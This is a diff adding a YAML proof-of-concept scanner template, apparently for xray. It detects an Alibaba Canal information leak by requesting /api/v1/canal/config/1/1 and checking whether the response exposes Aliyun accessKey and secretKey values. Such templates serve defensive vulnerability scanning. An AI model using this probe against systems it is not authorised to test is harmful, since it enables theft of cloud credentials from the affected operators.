@@ -1,0 +1,17 @@
+name: yaml-poc-alibaba-canal-leak-CT-158902
+binding: 59fe8cff-7abd-4343-934f-fdadd08ccb01
+detail:
+    author: system_user
+    vulnerability:
+        id: 34233d29-bf98-45cd-bc37-9a43fdcac6f1
+        level: medium
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /api/v1/canal/config/1/1
+            follow_redirects: false
+        expression: response.status == 200 && response.content_type.icontains("application/json") && response.body.bcontains(b"ncanal.aliyun.accessKey") && response.body.bcontains(b"ncanal.aliyun.secretKey")
+expression: r0()
